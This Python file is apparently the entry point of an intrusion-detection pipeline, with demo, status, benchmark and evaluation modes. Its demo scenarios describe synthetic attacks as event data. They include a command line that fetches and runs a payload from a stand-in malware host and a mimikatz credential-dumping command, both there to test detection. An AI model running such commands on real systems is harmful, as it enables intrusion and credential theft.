from __future__ import annotations
"""
AHRAS Module 2 — Main Entry Point
-----------------------------------
Starts the complete detection pipeline:

  1. Bootstrap ML models with synthetic normal traffic
  2. Start normalized.events consumer
  3. Run hybrid detection (signature + ML + statistical)
  4. Persist alerts to storage
  5. Publish scored events to detection.results

Run modes:
  python -m detection.main              # full pipeline
  python -m detection.main --eval       # run evaluation benchmark
  python -m detection.main --demo       # inject demo events and show live alerts
  python -m detection.main --status     # print model status and exit
"""

import os
import sys
import time
import uuid
import logging
import argparse
import threading
from pathlib import Path

# Ensure project root is first in sys.path to prevent detection/pipeline.py from shadowing root pipeline package
_project_root = str(Path(__file__).resolve().parent.parent)
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)
_detection_dir = str(Path(__file__).resolve().parent)
if _detection_dir in sys.path:
    sys.path.remove(_detection_dir)

log = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Demo mode — inject known attacks and watch detection live
# ─────────────────────────────────────────────────────────────────────────────

def _run_demo() -> None:
    from pipeline.bus import get_producer
    from normalizer.ocsf_normalizer import (
        _norm_network, _norm_process, _norm_file, _norm_cloud
    )
    from detection.hybrid_engine import get_combiner
    from detection.pipeline import bootstrap_ml_models

    print("\n▶  AHRAS Module 2 — Live Detection Demo")
    print("─" * 55)
    print("  Bootstrapping ML models...")
    bootstrap_ml_models()
    print("  Models ready.\n")

    combiner = get_combiner()

    def _ts():
        from datetime import datetime, timezone
        return datetime.now(timezone.utc).isoformat()

    def _eid():
        return str(uuid.uuid4())

    scenarios = [
        # (label, event_builder)
        ("Normal HTTPS traffic",
         lambda: _norm_network({
             "event_id": _eid(), "source": "network_tap", "timestamp": _ts(),
             "src_ip": "192.168.1.10", "dst_ip": "142.250.74.14",
             "src_port": 54321, "dst_port": 443, "protocol": "TCP",
             "packet_count": 25, "byte_count": 8000, "duration_sec": 2.0,
             "tcp_flags": ["SYN","ACK"], "unique_dst_ports": 1,
         })),
        ("Port scan (200 unique ports)",
         lambda: _norm_network({
             "event_id": _eid(), "source": "network_tap", "timestamp": _ts(),
             "src_ip": "10.0.0.50", "dst_ip": "192.168.1.1",
             "src_port": 54321, "dst_port": 80, "protocol": "TCP",
             "packet_count": 1, "byte_count": 60, "duration_sec": 0.05,
             "tcp_flags": ["SYN"], "unique_dst_ports": 200,
         })),
        ("SSH brute force",
         lambda: _norm_network({
             "event_id": _eid(), "source": "network_tap", "timestamp": _ts(),
             "src_ip": "45.33.32.156", "dst_ip": "192.168.1.5",
             "src_port": 54999, "dst_port": 22, "protocol": "TCP",
             "packet_count": 500, "byte_count": 30000, "duration_sec": 5.0,
             "tcp_flags": ["SYN","ACK"], "unique_dst_ports": 1,
         })),
        ("Ransomware: high-entropy file write",
         lambda: _norm_file({
             "event_id": _eid(), "source": "host_agent",
             "event_type": "file_write", "timestamp": _ts(),
             "hostname": "WORKSTATION-01",
             "filepath": "/home/alice/Documents/budget2024.xlsx.enc",
             "entropy": 7.94, "high_entropy": True, "sha256": "de" * 32,
         })),
        ("Suspicious lineage: LibreOffice → bash",
         lambda: _norm_process({
             "event_id": _eid(), "source": "host_agent",
             "event_type": "process_spawn", "timestamp": _ts(),
             "hostname": "WORKSTATION-01", "pid": 9876, "name": "bash",
             "exe": "/bin/bash",
             "cmdline": "bash -c 'wget http://malware.example.com/payload.sh | bash'",
             "username": "alice", "parent_pid": 5432,
             "parent_name": "libreoffice",
         })),
        ("Critical cloud: CloudTrail disabled",
         lambda: _norm_cloud({
             "event_id": _eid(), "source": "cloud_adapter",
             "event_type": "cloud_api_call", "timestamp": _ts(),
             "provider": "aws", "action": "cloudtrail:StopLogging",
             "severity_hint": "critical", "user_identity": "unknown-external",
             "source_ip": "185.220.101.5", "region": "us-east-1",
             "user_agent": "python-requests/2.31.0",
             "request_parameters": {}, "error_code": None,
         })),
        ("Credential dump attempt",
         lambda: _norm_process({
             "event_id": _eid(), "source": "host_agent",
             "event_type": "process_spawn", "timestamp": _ts(),
             "hostname": "DC-01", "pid": 7777, "name": "mimikatz.exe",
             "exe": "C:\\Users\\attacker\\mimikatz.exe",
             "cmdline": "mimikatz privilege::debug sekurlsa::logonpasswords exit",
             "username": "SYSTEM", "parent_pid": 1,
             "parent_name": "cmd.exe",
         })),
        ("Normal cloud: S3 read",
         lambda: _norm_cloud({
             "event_id": _eid(), "source": "cloud_adapter",
             "event_type": "cloud_api_call", "timestamp": _ts(),
             "provider": "aws", "action": "s3:GetObject", "severity_hint": "low",
             "user_identity": "alice@corp.com", "source_ip": "10.0.0.51",
             "region": "us-east-1", "user_agent": "boto3/1.28.0",
             "request_parameters": {}, "error_code": None,
         })),
    ]

    _SEV_COLOR = {
        "CRITICAL": "\033[1;31m",  # bold red
        "HIGH":     "\033[0;31m",  # red
        "MEDIUM":   "\033[0;33m",  # yellow
        "LOW":      "\033[0;34m",  # blue
        "INFO":     "\033[0;37m",  # grey
    }
    _RESET = "\033[0m"

    for label, evt_fn in scenarios:
        evt    = evt_fn()
        result = combiner.process(evt)
        if result is None:
            continue

        sev_col = _SEV_COLOR.get(result.severity, "")
        alert   = "🚨 ALERT" if result.is_alert else "  OK   "
        engines = ",".join(result.engines_fired) if result.engines_fired else "none"
        text    = result.explanation.get("explanation_text", "")[:72]

        # Full-width alert card
        top_feats = result.explanation.get("top_features", [])
        feat_str  = " | ".join(
            f"{f['feature']}({f['deviation_pct']:+.0f}%)"
            for f in top_feats[:3]
        ) if top_feats else "—"
        xai_full = result.explanation.get("explanation_text", "")
        mitre    = result.explanation.get("mitre_technique", "")
        sig_dets = result.signature_matches
        rule_ids = ", ".join(s["rule_id"] for s in sig_dets) if sig_dets else "—"

        print(f"  {sev_col}{'━'*54}{_RESET}")
        print(f"  {sev_col}{alert}  {result.severity:<8} conf={result.confidence:.3f}  "
              f"[{engines}]{_RESET}")
        print(f"  Scenario  : {label}")
        print(f"  Attack    : {result.attack_type or 'none'}")
        print(f"  Rules     : {rule_ids}")
        if mitre:
            print(f"  MITRE     : {mitre}")
        print(f"  Top feats : {feat_str}")
        print(f"  XAI       : {xai_full}")
        print(f"  Latency   : {result.processing_ms:.1f}ms")
        print()
        time.sleep(0.1)


# ─────────────────────────────────────────────────────────────────────────────
# Status mode
# ─────────────────────────────────────────────────────────────────────────────

def _run_status() -> None:
    from detection.anomaly_engine.ml_engine import get_model_status
    from detection.pipeline import get_pipeline_stats
    from storage.store import get_store
    from config.settings import MONGO_COL_ALERTS, MONGO_COL_EVENTS

    print("\n  AHRAS Module 2 — Status")
    print("─" * 45)

    status = get_model_status()
    if not status:
        print("  No models loaded yet.")
    for cls, s in status.items():
        trained = "✅ trained" if s["trained"] else "⏳ waiting"
        print(f"  {cls:<30} {trained} (buf={s['buffer_size']})")

    store = get_store()
    n_events = store.count(MONGO_COL_EVENTS)
    n_alerts = store.count(MONGO_COL_ALERTS)
    print(f"\n  Events in storage : {n_events}")
    print(f"  Alerts in storage : {n_alerts}")
    print()


# ─────────────────────────────────────────────────────────────────────────────
# Full pipeline mode
# ─────────────────────────────────────────────────────────────────────────────

def _run_pipeline() -> None:
    from detection.pipeline import (
        bootstrap_ml_models, run_detection_pipeline, get_pipeline_stats
    )

    print("\n▶  AHRAS Module 2 — Detection Pipeline")
    print("─" * 45)
    print("  Bootstrapping ML models...")
    bootstrap_ml_models()
    print("  Bootstrap complete. Listening for events...")
    print("  Press Ctrl+C to stop.\n")

    stop = threading.Event()

    # Status printer thread
    def _print_stats():
        while not stop.is_set():
            time.sleep(30)
            s = get_pipeline_stats()
            print(f"\n  [STATS] processed={s['processed']} "
                  f"alerts={s['alerts']} "
                  f"errors={s['errors']} "
                  f"alert_rate={s['alert_rate']:.2%}")

    t_stats = threading.Thread(target=_print_stats, daemon=True)
    t_stats.start()

    try:
        run_detection_pipeline(stop)
    except KeyboardInterrupt:
        stop.set()
        print("\n  Detection pipeline stopped.")


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────


def _run_benchmark() -> None:
    """Measure real-world throughput (events/sec) — startup KPI."""
    from detection.pipeline import bootstrap_ml_models
    from detection.hybrid_engine import get_combiner
    from normalizer.ocsf_normalizer import _norm_network, _norm_file, _norm_cloud
    import uuid

    print("\n▶  AHRAS Module 2 — Throughput Benchmark")
    print("─" * 50)
    print("  Bootstrapping models...")
    bootstrap_ml_models()

    def ts():
        from datetime import datetime, timezone
        return datetime.now(timezone.utc).isoformat()
    def eid(): return str(uuid.uuid4())

    combiner = get_combiner()
    N = 500
    evts = []
    for i in range(N):
        if i % 3 == 0:
            evts.append(_norm_network({
                "event_id":eid(),"source":"network_tap","timestamp":ts(),
                "src_ip":"192.168.1.5","dst_ip":"10.0.0.1","src_port":54321,
                "dst_port":443,"protocol":"TCP","packet_count":i%50+1,
                "byte_count":1500,"duration_sec":1.0,
                "tcp_flags":["SYN","ACK"],"unique_dst_ports":1,
            }))
        elif i % 3 == 1:
            evts.append(_norm_file({
                "event_id":eid(),"source":"host_agent","event_type":"file_write",
                "timestamp":ts(),"hostname":"h","filepath":f"/tmp/file{i}.txt",
                "entropy":3.5,"high_entropy":False,"sha256":"",
            }))
        else:
            evts.append(_norm_cloud({
                "event_id":eid(),"source":"cloud_adapter","event_type":"cloud_api_call",
                "timestamp":ts(),"provider":"aws","action":"s3:GetObject",
                "severity_hint":"low","user_identity":"alice@corp.com",
                "source_ip":"10.0.0.1","region":"us-east-1","user_agent":"cli",
                "request_parameters":{},"error_code":None,
            }))

    import time, numpy as np
    latencies = []
    t_start = time.perf_counter()
    for evt in evts:
        t0 = time.perf_counter()
        combiner.process(evt)
        latencies.append((time.perf_counter() - t0) * 1000)
    elapsed = time.perf_counter() - t_start

    latencies = np.array(latencies)
    stats = combiner.get_stats()

    print(f"  Events processed : {N}")
    print(f"  Total time       : {elapsed:.2f}s")
    print(f"  Throughput       : {N/elapsed:.0f} events/sec")
    print(f"  Mean latency     : {latencies.mean():.1f}ms")
    print(f"  P50 latency      : {np.percentile(latencies,50):.1f}ms")
    print(f"  P95 latency      : {np.percentile(latencies,95):.1f}ms")
    print(f"  P99 latency      : {np.percentile(latencies,99):.1f}ms")
    print(f"  Max latency      : {latencies.max():.1f}ms")
    print(f"  Alert rate       : {stats['alert_rate']:.1%}")
    print()
    # Publication target: >50 events/sec, P99 <500ms
    ok_throughput = (N/elapsed) > 50
    ok_p99        = np.percentile(latencies,99) < 500
    print(f"  Publication target (>50 ev/s)  : {'✅ PASS' if ok_throughput else '❌ FAIL'}")
    print(f"  Publication target (P99<500ms) : {'✅ PASS' if ok_p99 else '❌ FAIL'}")
    print()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="AHRAS Module 2 — Hybrid Detection Engine"
    )
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--demo",   action="store_true",
                       help="Run demo: inject attack scenarios and show live detection")
    group.add_argument("--eval",   action="store_true",
                       help="Run evaluation benchmark (paper metrics)")
    group.add_argument("--status",    action="store_true",
                       help="Show model and storage status then exit")
    group.add_argument("--benchmark", action="store_true",
                       help="Run throughput benchmark (events/sec)")
    parser.add_argument("--log-level", default="WARNING",
                        choices=["DEBUG","INFO","WARNING","ERROR"])
    args = parser.parse_args()

    logging.basicConfig(
        level=getattr(logging, args.log_level),
        format="%(asctime)s [%(name)s] %(levelname)s %(message)s",
    )

    if args.demo:
        _run_demo()
    elif args.eval:
        from detection.evaluator import run_evaluation
        run_evaluation()
    elif args.status:
        _run_status()
    elif args.benchmark:
        _run_benchmark()
    else:
        _run_pipeline()


if __name__ == "__main__":
    main()
